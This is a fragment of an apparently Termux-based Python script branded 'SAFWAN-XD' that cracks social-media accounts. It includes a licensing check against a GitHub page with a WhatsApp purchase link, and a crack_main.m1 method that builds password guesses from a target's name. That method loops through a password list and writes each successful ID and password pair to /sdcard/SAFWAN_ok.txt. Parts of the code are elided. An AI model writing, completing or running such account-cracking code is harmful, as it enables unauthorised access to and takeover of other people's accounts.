...
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get('https://github.com/safwangaiming11/APPROVAL').text
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+8801568722961?text={bumper}")
                        qsbuy()
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[SAFWAN-XD] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[SAFWAN-XD-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/SAFWAN_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
